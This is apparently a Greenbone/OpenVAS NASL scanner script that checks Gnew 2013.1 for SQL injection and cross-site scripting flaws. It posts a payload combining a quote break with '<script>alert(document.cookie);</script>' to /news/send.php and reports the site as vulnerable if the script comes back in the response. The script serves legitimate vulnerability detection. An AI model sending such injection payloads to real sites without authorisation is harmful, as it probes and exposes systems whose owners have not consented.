# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804110");
  script_version("2024-08-09T15:39:05+0000");
  script_tag(name:"last_modification", value:"2024-08-09 15:39:05 +0000 (Fri, 09 Aug 2024)");
  script_tag(name:"creation_date", value:"2013-10-17 14:49:54 +0530 (Thu, 17 Oct 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2013-5639", "CVE-2013-5640", "CVE-2013-7349", "CVE-2013-7368");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Gnew <= 2013.1 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Gnew is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws in Gnew exists due to:

  - Insufficient filtration of 'friend_email' HTTP POST parameter passed to /news/send.php and
  users/password.php scripts, 'user_email' HTTP POST parameter passed to /users/register.php
  script, 'news_id' HTTP POST parameter passed to news/send.php script, 'thread_id' HTTP POST
  parameter passed to posts/edit.php script, 'story_id' HTTP POST parameter passed to
  comments/index.php script, 'answer_id' and 'question_id' HTTP POST parameters passed to
  polls/vote.php script, 'category_id' HTTP POST parameter passed to news/submit.php script,
  'post_subject' and 'thread_id' HTTP POST parameters passed to posts/edit.php script.

  - Insufficient validation of user-supplied input passed via the 'gnew_language' cookie to
  /users/login.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML script code in a user's browser session in the context of an affected site, and
  inject or manipulate SQL queries in the back-end database, allowing for the manipulation or
  disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Gnew version 2013.1 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54466");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62817");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62818");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Oct/7");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/28684");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/123482");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/gnew", "/cms", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/news/index.php");
  if (!res || res !~ "^HTTP/1\.[01] 200" || ">Gnew<" >!< res)
    continue;

  url = dir + "/news/send.php";

  headers = make_array("Content-Type", "application/x-www-form-urlencoded");

  data = "send=1&user_name=username&user_email=a%40b.com&friend_email=c@d.com&news_id=-1'" +
         "<script>alert(document.cookie);</script>";

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req);

  if (res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie);</script>" >< res) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
